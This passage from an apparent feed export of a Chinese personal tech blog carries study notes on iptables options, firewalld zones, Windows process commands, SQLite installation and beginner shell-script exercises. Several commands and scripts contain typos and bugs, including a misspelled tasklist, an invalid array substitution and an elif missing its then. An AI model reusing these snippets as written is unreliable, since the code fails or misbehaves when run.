;&#x5916;&#x4E0D;&#x5BF9;&#x6570;&#x636E;&#x5305;&#x505A;&#x4EFB;&#x4F55;&#x5176;&#x4ED6;&#x64CD;&#x4F5C;&#xFF0C;&#x4ECD;&#x7136;&#x8BA9;&#x4E0B;&#x4E00;&#x6761;&#x89C4;&#x5219;&#x53BB;&#x5339;&#x914D;&#x3002;</li></ul><p><strong>&#x9009;&#x9879;</strong></p><pre><code>-t&#xFF0C;--table&#xFF1A;&#x5BF9;&#x6307;&#x5B9A;&#x7684;&#x8868;table&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;table&#x5FC5;&#x987B;&#x662F;raw&#xFF0C;nat&#xFF0C;filter&#xFF0C;mangle&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x6307;&#x5B9A;-t&#xFF0C;&#x9ED8;&#x8BA4;filter&#x8868;# &#x901A;&#x7528;&#x5339;&#x914D;&#xFF1A;&#x6E90;&#x5730;&#x5740;&#xFF0C;&#x76EE;&#x6807;&#x5730;&#x5740;&#x7684;&#x5339;&#x914D;-p&#xFF1A;&#x6307;&#x5B9A;&#x8981;&#x5339;&#x914D;&#x7684;&#x534F;&#x8BAE;&#x7C7B;&#x578B;-s&#xFF0C;--souce [!] address[/mask]&#xFF1A;&#x628A;&#x6307;&#x5B9A;&#x7684; &#x4E00;&#x4E2A;/&#x4E00;&#x7EC4; &#x5730;&#x5740;&#x4F5C;&#x4E3A;&#x6E90;&#x5730;&#x5740;&#xFF0C;&#x6309;&#x6B64;&#x89C4;&#x5219;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x3002;&#x5F53;&#x540E;&#x9762;&#x6CA1;&#x6709;maks&#x65F6;&#xFF0C;address&#x662F;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#xFF0C;&#x6BD4;&#x5982;192.168.1.1&#xFF1B;&#x5F53;mask&#x6307;&#x5B9A;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8868;&#x793A;&#x4E00;&#x7EC4;&#x8303;&#x56F4;&#x5185;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6BD4;&#x5982;192.168.1.0/255.255.255.0-d&#xFF0C;--destination [!] address[/mask]&#xFF1A;&#x6307;&#x5B9A;&#x76EE;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6309;&#x6B64;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;-i&#xFF0C;--in-interface [!] &lt;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x540D;&#x79F0;&gt;&#xFF1A;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x5305;&#x7684;&#x6765;&#x81EA;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#xFF0C;&#x6BD4;&#x5982;&#x6700;&#x5E38;&#x89C1;&#x7684;eht0&#x3001;ens33&#x3002;&#x8BE5;&#x9009;&#x9879;&#x53EA;&#x5BF9;INPUT&#x3001;FORWARD&#x3001;PREROUTING&#x8FD9;&#x4E09;&#x4E2A;&#x94FE;&#x8D77;&#x4F5C;&#x7528;-o&#xFF0C;--out-interface [!] &lt;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x540D;&#x79F0;&gt;&#xFF1A;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x5305;&#x51FA;&#x53BB;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x3002;&#x53EA;&#x5BF9;OUTPUT&#x3001;FORWARD&#x3001;POSTROUTING&#x4E09;&#x4E2A;&#x94FE;&#x8D77;&#x4F5C;&#x7528;&#x3002;# &#x67E5;&#x770B;&#x7BA1;&#x7406;&#x547D;&#x4EE4;-L&#xFF0C; --list [chain] &#xFF1A;&#x5217;&#x51FA;&#x94FE;chain&#x4E0A;&#x9762;&#x7684;&#x6240;&#x6709;&#x89C4;&#x5219;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x94FE;&#xFF0C;&#x5217;&#x51FA;&#x8868;&#x7684;&#x6240;&#x6709;&#x94FE;&#x6240;&#x6709;&#x89C4;&#x5219;&#x3002;# &#x89C4;&#x5219;&#x7BA1;&#x7406;&#x547D;&#x4EE4;-A&#xFF0C;--append chain rule-specification&#xFF1A;&#x5728;&#x6307;&#x5B9A;&#x94FE;chain&#x7684;&#x672B;&#x5C3E;&#x63D2;&#x5165;&#x6307;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x8FD9;&#x6761;&#x89C4;&#x5219;&#x4F1A;&#x88AB;&#x653E;&#x5230;&#x6700;&#x540E;&#xFF0C;&#x6700;&#x540E;&#x624D;&#x6267;&#x884C;&#x3002;-I&#xFF0C;--insert chain [rulenum] rule-specification&#xFF1A;&#x5728;&#x94FE;chain&#x4E2D;&#x7684;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x6216;&#x591A;&#x6761;&#x89C4;&#x5219;&#x3002;&#x5982;&#x679C;&#x6307;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#x53F7;&#x662F;1&#xFF0C;&#x5219;&#x5728;&#x94FE;&#x7684;&#x5934;&#x90E8;&#x63D2;&#x5165;&#x3002;&#x8FD9;&#x4E5F;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x89C4;&#x5219;&#x53F7;&#x3002;-D&#xFF0C;--delete chain rule-specification/--delete chain rulenum &#xFF1A;&#x5728;&#x6307;&#x5B9A;&#x7684;&#x94FE;chain&#x4E2D;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x6307;&#x5B9A;&#x89C4;&#x5219;-R num&#xFF0C;replays&#xFF1A;&#x66FF;&#x6362;/&#x4FEE;&#x6539;&#x7B2C;&#x51E0;&#x6761;&#x89C4;&#x5219;# &#x94FE;&#x7BA1;&#x7406;&#x547D;&#x4EE4;-P&#xFF0C;--policy chain target&#xFF1A;&#x4E3A;&#x6307;&#x5B9A;&#x7684;&#x94FE;chain&#x8BBE;&#x7F6E;&#x7B56;&#x7565;target&#x3002;&#x6CE8;&#x610F;&#xFF0C;&#x53EA;&#x6709;&#x5185;&#x7F6E;&#x7684;&#x94FE;&#x624D;&#x5141;&#x8BB8;&#x6709;&#x7B56;&#x7565;&#xFF0C;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x662F;&#x4E0D;&#x5141;&#x8BB8;&#x7684;&#x3002;-F&#xFF0C;--flush [cahin]&#xFF1A;&#x6E05;&#x7A7A;&#x6307;&#x5B9A;&#x94FE;chain&#x4E0A;&#x9762;&#x7684;&#x6240;&#x6709;&#x89C4;&#x5219;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x94FE;&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;&#x6E05;&#x7A7A;&#x6240;&#x6709;&#x94FE;&#x4E0A;&#x7684;&#x89C4;&#x5219;-N&#xFF0C;--new-chain chain&#xFF1A;&#x7528;&#x6307;&#x5B9A;&#x7684;&#x540D;&#x5B57;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x94FE;-X&#xFF0C;--delete-chain [chain]&#xFF1A;&#x5220;&#x9664;&#x6307;&#x5B9A;&#x7684;&#x94FE;&#xFF0C;&#x8FD9;&#x4E2A;&#x94FE;&#x5FC5;&#x987B;&#x6CA1;&#x6709;&#x88AB;&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x89C4;&#x5219;&#x5F15;&#x7528;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x6761;&#x4E0A;&#x5FC5;&#x987B;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x89C4;&#x5219;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x94FE;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x5220;&#x9664;&#x6240;&#x6709;&#x7528;&#x6237;&#x94FE;-E&#xFF0C;--rename-chain old-chain new-chain&#xFF1A;&#x91CD;&#x547D;&#x540D;&#x94FE;&#x3002;&#x8FD9;&#x5E76;&#x4E0D;&#x4F1A;&#x5BF9;&#x5185;&#x90E8;&#x94FE;&#x9020;&#x6210;&#x4EFB;&#x4F55;&#x5F71;&#x54CD;-Z&#xFF0C;--zero [chain]&#xFF1A;&#x628A;&#x6307;&#x5B9A;&#x94FE;&#xFF0C;&#x6216;&#x8868;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x94FE;&#x7684;&#x6240;&#x6709;&#x8BA1;&#x6570;&#x5668;&#x6E05;&#x96F6;&#x3002;-j&#xFF0C;--jump target &lt;&#x6307;&#x5B9A;&#x76EE;&#x6807;&gt;&#xFF1A;&#x53CA;&#x6EE1;&#x8DB3;&#x67D0;&#x6761;&#x4EF6;&#x65F6;&#x8BE5;&#x6267;&#x884C;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x52A8;&#x4F5C;&#x3002;target&#x53EF;&#x4EE5;&#x662F;&#x5185;&#x7F6E;&#x7684;&#x76EE;&#x6807;&#xFF0C;&#x6BD4;&#x5982;ACCEPT&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x94FE;&#x3002;</code></pre><p><strong>&#x683C;&#x5F0F;</strong></p><pre><code>iptables -t &#x8868;&#x540D; &lt;-A/I/D/R&gt; &#x89C4;&#x5219;&#x94FE;&#x540D; [&#x89C4;&#x5219;&#x53F7;] &lt;-i/o &#x7F51;&#x5361;&#x540D;&gt; -p &#x534F;&#x8BAE;&#x540D; &lt;-s &#x6E90;IP/&#x6E90;&#x5B50;&#x7F51;&gt;  --sport &#x6E90;&#x7AEF;&#x53E3; &lt;-d &#x76EE;&#x6807;IP/&#x76EE;&#x6807;&#x5B50;&#x7F51;&gt; --dport &#x76EE;&#x6807;&#x7AEF;&#x53E3; -j &#x52A8;&#x4F5C;</code></pre><h2 id="iptables-restore"><a href="#iptables-restore" class="headerlink" title="iptables-restore"></a>iptables-restore</h2><h2 id="iptables-save"><a href="#iptables-save" class="headerlink" title="iptables-save"></a>iptables-save</h2><h2 id="iptstate"><a href="#iptstate" class="headerlink" title="iptstate"></a>iptstate</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;iptables&quot;&gt;&lt;a href=&quot;#iptables&quot; class=&quot;headerlink&quot; title=&quot;iptables&quot;&gt;&lt;/a&gt;iptables&lt;/h2&gt;&lt;h3 id=&quot;iptables&amp;#x7684;&amp;#x56DB;&amp;#x8868;&amp;#x4E94;&amp;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>firewalld学习笔记</title>
    <link href="https://marnm.github.io//posts/c7b4ec91/"/>
    <id>https://marnm.github.io//posts/c7b4ec91/</id>
    <published>2022-06-07T04:53:28.000Z</published>
    <updated>2022-06-07T05:02:37.310Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FirewallD"><a href="#FirewallD" class="headerlink" title="FirewallD"></a>FirewallD</h1><p>RHEL 7&#x7CFB;&#x7EDF;&#x4E2D;&#x96C6;&#x6210;&#x4E86;&#x591A;&#x6B3E;&#x9632;&#x706B;&#x5899;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF0C;&#x5176;&#x4E2D;firewalld&#xFF08;Dynamic Firewall Manager of Linux Systems&#xFF0C;Linux&#x7CFB;&#x7EDF;&#x52A8;&#x6001;&#x9632;&#x706B;&#x5899;&#x7BA1;&#x7406;&#x5668;&#xFF09;&#x670D;&#x52A1;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#x9632;&#x706B;&#x5899;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;&#x62E5;&#x6709;&#x57FA;&#x4E8E;CLI&#xFF08;&#x547D;&#x4EE4;&#x884C;&#x754C;&#x9762;&#xFF09;&#x548C;&#x57FA;&#x4E8E;GUI&#xFF08;&#x56FE;&#x5F62;&#x7528;&#x6237;&#x754C;&#x9762;&#xFF09;&#x7684;&#x4E24;&#x79CD;&#x7BA1;&#x7406;&#x65B9;&#x5F0F;&#x3002;</p><p>FirewallD&#x662F;CentOS 7&#x7684;&#x4E00;&#x5927;&#x7279;&#x6027;&#xFF0C;&#x6700;&#x5927;&#x7684;&#x597D;&#x5904;&#x662F;&#x652F;&#x6301;&#x52A8;&#x6001;&#x66F4;&#x65B0;&#xFF0C;&#x4E0D;&#x7528;&#x91CD;&#x542F;&#x670D;&#x52A1;&#xFF1B;&#x52A0;&#x5165;&#x4E86;&#x9632;&#x706B;&#x5899;&#x201C;zone&#x201D;&#x7684;&#x6982;&#x5FF5;</p><p>&#x76F8;&#x8F83;&#x4E8E;&#x4F20;&#x7EDF;&#x7684;&#x9632;&#x706B;&#x5899;&#x7BA1;&#x7406;&#x914D;&#x7F6E;&#x5DE5;&#x5177;&#xFF0C;firealld&#x6240;&#x652F;&#x6301;&#x52A8;&#x6001;&#x66F4;&#x65B0;&#x6280;&#x672F;&#x5E76;&#x52A0;&#x5165;&#x4E86;&#x533A;&#x57DF;&#xFF08;zone&#xFF09;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;&#x533A;&#x57DF;&#x5C31;&#x662F;firewalld&#x9884;&#x5148;&#x51C6;&#x5907;&#x4E86;&#x51E0;&#x5957;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x96C6;&#x5408;&#xFF08;&#x7B56;&#x7565;&#x6A21;&#x677F;&#xFF09;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x751F;&#x4EA7;&#x573A;&#x666F;&#x7684;&#x4E0D;&#x540C;&#x800C;&#x9009;&#x62E9;&#x5408;&#x9002;&#x7684;&#x7B56;&#x7565;&#x96C6;&#x5408;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x7684;&#x5FEB;&#x901F;&#x5207;&#x6362;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x6709;&#x4E00;&#x53F0;&#x7B14;&#x8BB0;&#x672C;&#x7535;&#x8111;&#xFF0C;&#x6BCF;&#x5929;&#x90FD;&#x8981;&#x5728;&#x529E;&#x516C;&#x5BA4;&#x3001;&#x5496;&#x5561;&#x5385;&#x548C;&#x5BB6;&#x91CC;&#x4F7F;&#x7528;&#x3002;&#x6309;&#x5E38;&#x7406;&#x6765;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E09;&#x8005;&#x7684;&#x5B89;&#x5168;&#x6027;&#x6309;&#x7167;&#x7531;&#x9AD8;&#x5230;&#x4F4E;&#x7684;&#x987A;&#x5E8F;&#x6765;&#x6392;&#x5217;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x5BB6;&#x5EAD;&#x3001;&#x516C;&#x53F8;&#x529E;&#x516C;&#x5BA4;&#x3001;&#x5496;&#x5561;&#x5385;&#x3002;&#x5F53;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x5E0C;&#x671B;&#x4E3A;&#x8FD9;&#x53F0;&#x7B14;&#x8BB0;&#x672C;&#x7535;&#x8111;&#x6307;&#x5B9A;&#x5982;&#x4E0B;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x89C4;&#x5219;&#xFF1A;</p><ul><li>&#x5728;&#x5BB6;&#x4E2D;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;&#x6240;&#x6709;&#x670D;&#x52A1;&#xFF1B;&#x5728;&#x529E;&#x516C;&#x5BA4;&#x5185;&#x4EC5;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x5171;&#x4EAB;&#x670D;&#x52A1;&#xFF1B;&#x5728;&#x5496;&#x5561;&#x5385;&#x4EC5;&#x5141;&#x8BB8;&#x4E0A;&#x7F51;&#x6D4F;&#x89C8;&#x3002;&#x5728;&#x4EE5;&#x5F80;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x9891;&#x7E41;&#x7684;&#x624B;&#x52A8;&#x8BBE;&#x7F6E;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x89C4;&#x5219;&#xFF0C;&#x800C;&#x73B0;&#x5728;&#x53EA;&#x9700;&#x8981;&#x9884;&#x8BBE;&#x597D;&#x533A;&#x57DF;&#x96C6;&#x5408;&#xFF0C;&#x7136;&#x540E;&#x53EA;&#x9700;&#x8F7B;&#x70B9;&#x9F20;&#x6807;&#x5C31;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x5207;&#x6362;&#x4E86;&#xFF0C;&#x4ECE;&#x800C;&#x6781;&#x5927;&#x63D0;&#x5347;&#x4E86;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x7684;&#x5E94;&#x7528;&#x6548;&#x7387;&#x3002;</li><li>firewalld&#x4E2D;&#x5E38;&#x89C1;&#x7684;&#x533A;&#x57DF;&#x540D;&#x79F0;&#xFF08;&#x9ED8;&#x8BA4;&#x4E3A;public&#xFF09;&#x4EE5;&#x53CA;&#x76F8;&#x5E94;&#x7684;&#x7B56;&#x7565;&#x89C4;&#x5219;&#x8868;&#x5982;2&#x6240;&#x793A;&#xFF1A;</li></ul><p>&#x8868;2. firewalld&#x4E2D;&#x5E38;&#x7528;&#x7684;&#x533A;&#x57DF;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x7B56;&#x7565;&#x89C4;&#x5219;</p><table><thead><tr><th>&#x533A;&#x57DF;</th><th>&#x9ED8;&#x8BA4;&#x89C4;&#x5219;&#x7B56;&#x7565;</th></tr></thead><tbody><tr><td>trusted</td><td>&#x5141;&#x8BB8;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x5305;&#x6D41;&#x5165;&#x4E0E;&#x6D41;&#x51FA;</td></tr><tr><td>home</td><td>&#x62D2;&#x7EDD;&#x6D41;&#x5165;&#x7684;&#x6D41;&#x91CF;&#xFF0C;&#x9664;&#x975E;&#x4E0E;&#x6D41;&#x51FA;&#x7684;&#x6D41;&#x91CF;&#x76F8;&#x5173;&#xFF1B;&#x800C;&#x5982;&#x679C;&#x6D41;&#x91CF;&#x4E0E;ssh&#x3001;mdns&#x3001;ipp-client&#x3001;samba-client&#x4E0E;dhcpv6-client&#x670D;&#x52A1;&#x76F8;&#x5173;&#xFF0C;&#x5219;&#x5141;&#x8BB8;&#x6D41;&#x91CF;</td></tr><tr><td>internal</td><td>&#x7B49;&#x540C;&#x4E8E;home&#x533A;&#x57DF;</td></tr><tr><td>work</td><td>&#x62D2;&#x7EDD;&#x6D41;&#x5165;&#x7684;&#x6D41;&#x91CF;&#xFF0C;&#x9664;&#x975E;&#x4E0E;&#x6D41;&#x51FA;&#x7684;&#x6D41;&#x91CF;&#x6570;&#x76F8;&#x5173;&#xFF1B;&#x800C;&#x5982;&#x679C;&#x6D41;&#x91CF;&#x4E0E;ssh&#x3001;ipp-client&#x4E0E;dhcpv6-client&#x670D;&#x52A1;&#x76F8;&#x5173;&#xFF0C;&#x5219;&#x5141;&#x8BB8;&#x6D41;&#x91CF;</td></tr><tr><td>public</td><td>&#x62D2;&#x7EDD;&#x6D41;&#x5165;&#x7684;&#x6D41;&#x91CF;&#xFF0C;&#x9664;&#x975E;&#x4E0E;&#x6D41;&#x51FA;&#x7684;&#x6D41;&#x91CF;&#x76F8;&#x5173;&#xFF1B;&#x800C;&#x5982;&#x679C;&#x6D41;&#x91CF;&#x4E0E;ssh&#x3001;dchpv6-client&#x670D;&#x52A1;&#x76F8;&#x5173;&#xFF0C;&#x5219;&#x5141;&#x8BB8;&#x6D41;&#x91CF;</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;FirewallD&quot;&gt;&lt;a href=&quot;#FirewallD&quot; class=&quot;headerlink&quot; title=&quot;FirewallD&quot;&gt;&lt;/a&gt;FirewallD&lt;/h1&gt;&lt;p&gt;RHEL 7&amp;#x7CFB;&amp;#x7EDF;&amp;#x4E2D;&amp;#x96C6;&amp;#x6
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows进程管理</title>
    <link href="https://marnm.github.io//posts/6ed6984b/"/>
    <id>https://marnm.github.io//posts/6ed6984b/</id>
    <published>2022-06-07T04:53:05.000Z</published>
    <updated>2022-06-07T05:03:00.960Z</updated>
    
    <content type="html"><![CDATA[<p>&#x67E5;&#x770B;&#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x7684;&#x8FDB;&#x7A0B;</p><pre><code>netstat -ano | findstr &quot;8080&quot;</code></pre><p>&#x67E5;&#x770B;&#x8FDB;&#x7A0B;&#x8BE6;&#x7EC6;&#x7A0B;&#x5E8F;</p><pre><code>tasklikst | findstr &quot;PID_NUM&quot;</code></pre><p>&#x7ED3;&#x675F;&#x8FDB;&#x7A0B;</p><pre><code>taskkill /T /F /PID pid_num</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;#x67E5;&amp;#x770B;&amp;#x6307;&amp;#x5B9A;&amp;#x7AEF;&amp;#x53E3;&amp;#x7684;&amp;#x8FDB;&amp;#x7A0B;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;netstat -ano | findstr &amp;quot;8080&amp;quot;
&lt;/code&gt;&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQLite安装</title>
    <link href="https://marnm.github.io//posts/aa142b64/"/>
    <id>https://marnm.github.io//posts/aa142b64/</id>
    <published>2022-06-07T04:52:54.000Z</published>
    <updated>2022-06-07T05:03:23.173Z</updated>
    
    <content type="html"><![CDATA[<p>&#x4E0B;&#x8F7D;&#x5730;&#x5740;<a href="https://www.sqlite.org/download.html" target="_blank" rel="noopener">https://www.sqlite.org/download.html</a></p><p>&#x6E90;&#x7801;&#x5B89;&#x88C5;</p><pre><code class="sh">tar -zxvf sqlite-autoconf-xxx.tar.gzcd sqlite-autoconf-xxx./configure --prefix=/usr/localmakemake install</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;#x4E0B;&amp;#x8F7D;&amp;#x5730;&amp;#x5740;&lt;a href=&quot;https://www.sqlite.org/download.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.sqlite.org/down
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SHELL脚本练习</title>
    <link href="https://marnm.github.io//posts/8a8ba1e/"/>
    <id>https://marnm.github.io//posts/8a8ba1e/</id>
    <published>2022-06-07T04:52:40.000Z</published>
    <updated>2022-06-07T05:03:43.249Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Hello World</strong></p><pre><code class="sh">#!/bin/bash&lt;!--more--&gt;function example {    echo &quot;Hello World&quot;}example</code></pre><hr><p><strong>&#x7528;&#x6237;&#x731C;&#x6570;&#x5B57;</strong></p><pre><code class="sh">#!/bin/bash# &#x811A;&#x672C;&#x751F;&#x6210;&#x4E00;&#x4E2A;100&#x4EE5;&#x5185;&#x7684;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x63D0;&#x793A;&#x7528;&#x6237;&#x731C;&#x6570;&#x5B57;&#xFF0C;&#x6839;&#x636E;&#x7528;&#x6237;&#x7684;&#x8F93;&#x5165;&#xFF0C;&#x63D0;&#x793A;&#x7528;&#x6237;&#x731C;&#x5BF9;&#x4E86;&#x3002;# &#x731C;&#x5C0F;&#x4E86;&#x6216;&#x731C;&#x5927;&#x4E86;&#xFF0C;&#x76F4;&#x81F3;&#x7528;&#x6237;&#x731C;&#x5BF9; &#x811A;&#x672C;&#x7ED3;&#x675F;# RANDOM &#x4E3A;&#x7CFB;&#x7EDF;&#x81EA;&#x5E26;&#x7684;&#x7CFB;&#x7EDF;&#x53D8;&#x91CF;&#xFF0C;&#x503C;&#x4E3A;0-32767&#x7684;&#x968F;&#x673A;&#x6570;# &#x4F7F;&#x7528;&#x53D6;&#x4F59;&#x7B97;&#x6CD5;&#x5C06;&#x968F;&#x673A;&#x6570;&#x53D8;&#x4E3A;1-100&#x7684;&#x968F;&#x673A;&#x6570;num=$[ RANDOM%100+1 ]echo &quot;$num&quot;# &#x4F7F;&#x7528; read &#x63D0;&#x793A;&#x7528;&#x6237;&#x731C;&#x6570;&#x5B57;# &#x4F7F;&#x7528; if &#x5224;&#x65AD;&#x7528;&#x6237;&#x731C;&#x6570;&#x5B57;&#x7684;&#x5927;&#x5C0F;&#x5173;&#x7CFB;&#xFF1A; # -eq&#xFF08;&#x7B49;&#x4E8E;&#xFF09;, -ne&#xFF08;&#x4E0D;&#x7B49;&#x4E8E;&#xFF09;&#xFF0C;-gt&#xFF08;&#x5927;&#x4E8E;&#xFF09;,-lt&#x5C0F;&#x4E8E;&#xFF0C;-le&#xFF08;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;&#xFF09;while :do    read -p &quot;&#x8BA1;&#x7B97;&#x673A;&#x751F;&#x6210;&#x4E86;&#x4E00;&#x4E2A;1-100&#x7684;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x4F60;&#x731C;&#xFF1A;&quot; guess    if [ $guess -eq $num ]    then echo &quot;&#x606D;&#x559C;&#xFF0C;&#x731C;&#x5BF9;&#x4E86;&quot;    elif [ $guess -gt $num ]    then echo &quot;Oops&#xFF0C;&#x731C;&#x5927;&#x4E86;&quot;    else echo &quot;Oops, &#x731C;&#x5C0F;&#x4E86;&quot;    fidone</code></pre><hr><p><strong>&#x526A;&#x5200;&#x77F3;&#x5934;&#x5E03; &#x6E38;&#x620F;</strong></p><pre><code class="sh">#!/bin/bashgame=(&#x526A;&#x5200; &#x77F3;&#x5934; &#x5E03;)num=$[ RANDOM%3 ]computer=${ game[$sum] }echo &quot;&#x8BF7;&#x6839;&#x636E;&#x4E0B;&#x5217;&#x63D0;&#x793A;&#x9009;&#x62E9;&#x60A8;&#x7684;&#x51FA;&#x62F3;&#x624B;&#x52BF;&quot;echo &quot;1. &#x77F3;&#x5934;&quot;echo &quot;2. &#x526A;&#x5200;&quot;echo &quot;3. &#x5E03;&quot;read -p &quot;&#x8BF7;&#x9009;&#x62E9; 1-3:&quot; personcase $person in1)    if [ $num -eq 0 ]    then echo &quot;&#x5E73;&#x5C40;&quot;    elif [ $num -eq 1 ]    then echo &quot;&#x4F60;&#x8D62;&#x4E86;&quot;    else         echo &quot;&#x7535;&#x8111;&#x8D62;&quot;    fi;;2)   if [ $num -eq 0 ]    then    echo &quot;&#x7535;&#x8111;&#x8D62;&quot;    elif [ $num -eq 1 ]    then        echo &quot;&#x5E73;&#x5C40;&quot;    else        echo &quot;&#x4F60;&#x8D62;&#x4E86;&quot;    fi;;3)    if [ $num -eq 0 ]    then        echo &quot;&#x4F60;&#x8D62;&quot;    elif [ $num -eq 1 ]        echo &quot;&#x7535;&#x8111;&#x8D62;&quot;    else        echo &quot;&#x5E73;&#x5C40;&quot;    fi;;*)    echo &quot;&#x5FC5;&#x987B;&#x8F93;&#x5165;1-3&#x7684;&#x6570;&#x5B57;&quot;esac</code></pre><hr><p><strong>&#x4E5D;&#x4E5D;&#x4E58;&#x6CD5;&#x8868;</strong></p><pre><code class="sh">#!/bin/bashfor i in `seq 9`do    for j in `seq $i`    do        echo -n &quot; $j*$i=$[i*j] &quot;    done        echodone</code></pre><hr><p><strong>if&#x8FD0;&#x7B97;&#x8868;&#x8FBE;&#x5F0F;</strong></p><pre><code class="sh">#!bin/bashif [ $1 -eq 2 ]; then    echo &quot;wo ai wenmin&quot;elif [ $1 -eq 3 ]; then    echo &quot;wo ai wenxing&quot;elif [ $1 -eq 4 ]; then    echo &quot;wo de xin&quot;elif [ $1 -eq 5 ]; then    echo &quot;wo de 